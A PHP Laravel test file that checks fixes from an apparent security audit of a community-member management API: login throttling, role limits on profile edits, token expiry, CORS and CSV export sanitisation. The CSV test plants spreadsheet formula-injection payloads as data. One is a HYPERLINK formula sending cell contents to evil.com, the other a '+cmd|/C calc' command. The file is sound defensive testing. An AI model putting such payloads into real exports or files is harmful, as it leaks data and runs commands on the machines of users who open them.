<?php

namespace Tests\Feature\Security;

use Tests\TestCase;
use App\Models\User;
use App\Models\Generus;
use Laravel\Sanctum\Sanctum;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Route;

class SecurityAuditTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();

        $migrations = [
            'database/migrations/0001_01_01_000000_create_users_table.php',
            'database/migrations/2026_05_15_122741_create_personal_access_tokens_table.php',
            'database/migrations/2026_05_15_123233_create_generuses_table.php',
            'database/migrations/2026_05_16_101334_create_events_table.php',
            'database/migrations/2026_07_29_195225_add_user_id_to_generus_table.php',
            'database/migrations/2026_08_06_104335_add_kode_unik_to_generus_table.php',
            'database/migrations/2026_08_18_203140_add_is_pengurus_to_generus_table.php',
            'database/migrations/2026_09_02_082219_add_is_pengurus_muda_mudi_to_generus_table.php',
            'database/migrations/2026_09_02_111505_add_is_ketua_wakil_kelompok_to_generus_table.php',
            'database/migrations/2026_10_03_131233_add_kelompok_to_users_and_events_table.php',
            'database/migrations/2026_11_09_161500_create_pengurus_tables_and_migrate_data.php',
        ];

        foreach ($migrations as $path) {
            Artisan::call('migrate', ['--path' => $path]);
        }
    }

    /**
     * AC-01 (REMEDIATED): Verifies throttle middleware is attached to POST /api/login.
     */
    public function test_login_endpoint_has_rate_limiting(): void
    {
        $routes = Route::getRoutes();
        $loginRoute = $routes->getByAction('App\Http\Controllers\Api\AuthController@login');
        
        $this->assertNotNull($loginRoute, 'Login route exists');
        $middleware = $loginRoute->gatherMiddleware();
        
        $hasThrottle = false;
        foreach ($middleware as $m) {
            if (str_starts_with($m, 'throttle:')) {
                $hasThrottle = true;
                break;
            }
        }

        $this->assertTrue($hasThrottle, 'REMEDIATION VERIFIED: /api/login now has throttle middleware attached.');
    }

    /**
     * AC-05 (REMEDIATED): Verifies normal users CANNOT alter their 'kelompok' and 'jenjang'.
     */
    public function test_user_profile_prohibits_tampering_with_kelompok_and_jenjang_by_regular_user(): void
    {
        $user = User::create([
            'name' => 'Peserta Slogo',
            'username' => 'peserta1',
            'password' => Hash::make('secret123'),
            'role' => 'user',
            'kelompok' => 'Kelompok Barat',
        ]);

        $generus = Generus::create([
            'nama_lengkap' => 'Peserta Slogo',
            'jenis_kelamin' => 'L',
            'kelompok' => 'Kelompok Barat',
            'jenjang' => '1 SMP',
            'status' => 'aktif',
            'user_id' => $user->id,
        ]);

        Sanctum::actingAs($user);

        // Regular user attempts to mutate group and educational level
        $response = $this->putJson('/api/user/profile', [
            'name' => 'Peserta Slogo Update',
            'username' => 'peserta1',
            'jenis_kelamin' => 'L',
            'kelompok' => 'Kelompok Timur',
            'jenjang' => 'MT',
        ]);

        $response->assertStatus(200);

        $generus->refresh();
        $user->refresh();

        // Name is updated, but administrative fields kelompok and jenjang must remain unchanged
        $this->assertEquals('Peserta Slogo Update', $generus->nama_lengkap);
        $this->assertEquals('Kelompok Barat', $generus->kelompok, 'REMEDIATION VERIFIED: Regular user cannot change their kelompok.');
        $this->assertEquals('1 SMP', $generus->jenjang, 'REMEDIATION VERIFIED: Regular user cannot self-promote jenjang to MT.');
    }

    /**
     * AC-05 (ADMIN): Verifies administrators CAN still update kelompok and jenjang.
     */
    public function test_admin_can_update_kelompok_and_jenjang(): void
    {
        $admin = User::create([
            'name' => 'Admin Slogo',
            'username' => 'adminslogo',
            'password' => Hash::make('secret123'),
            'role' => 'admin',
            'kelompok' => 'Kelompok Barat',
        ]);

        $generus = Generus::create([
            'nama_lengkap' => 'Admin Slogo',
            'jenis_kelamin' => 'L',
            'kelompok' => 'Kelompok Barat',
            'jenjang' => 'USMAN',
            'status' => 'aktif',
            'user_id' => $admin->id,
        ]);

        Sanctum::actingAs($admin);

        $response = $this->putJson('/api/user/profile', [
            'name' => 'Admin Slogo',
            'username' => 'adminslogo',
            'jenis_kelamin' => 'L',
            'kelompok' => 'Kelompok Pusat',
            'jenjang' => 'MT',
        ]);

        $response->assertStatus(200);

        $generus->refresh();
        $this->assertEquals('Kelompok Pusat', $generus->kelompok);
        $this->assertEquals('MT', $generus->jenjang);
    }

    /**
     * AC-07 (REMEDIATED): Verifies CSV export prefixes formula trigger characters with a single quote.
     */
    public function test_csv_export_sanitizes_formula_injection(): void
    {
        $admin = User::create([
            'name' => 'Admin Security Test',
            'username' => 'admintest2',
            'password' => Hash::make('adminpass123'),
            'role' => 'admin',
        ]);

        Sanctum::actingAs($admin);

        Generus::create([
            'nama_lengkap' => '=HYPERLINK("http://evil.com/leak?data="&A1,"Malicious")',
            'jenis_kelamin' => 'L',
            'kelompok' => 'Slogo',
            'jenjang' => 'USMAN',
            'status' => 'aktif',
            'keterangan' => '+cmd|/C calc!A0',
        ]);

        $response = $this->get('/api/admin/generus/export');
        $response->assertStatus(200);

        // Fetch stream content
        ob_start();
        $response->sendContent();
        $csvContent = ob_get_clean();

        // The CSV values must be sanitized with a leading single quote (')
        $this->assertStringContainsString("\"'=Hyperlink", $csvContent, 'REMEDIATION VERIFIED: Formula prefix = is sanitized with a single quote.');
        $this->assertStringContainsString("\"'+cmd", $csvContent, 'REMEDIATION VERIFIED: Formula prefix + is sanitized with a single quote.');
    }

    /**
     * AC-03 & AC-04 (REMEDIATED): Verifies Sanctum finite token expiration and clean CORS patterns.
     */
    public function test_configuration_security_posture_hardened(): void
    {
        $tokenExpiration = config('sanctum.expiration');
        $this->assertNotNull($tokenExpiration, 'REMEDIATION VERIFIED: Sanctum expiration is configured with a finite lifetime.');
        $this->assertEquals(1440, $tokenExpiration);

        $corsPatterns = config('cors.allowed_origins_patterns');
        $this->assertEmpty($corsPatterns, 'REMEDIATION VERIFIED: CORS allowed_origins_patterns wildcard is removed.');
    }
}
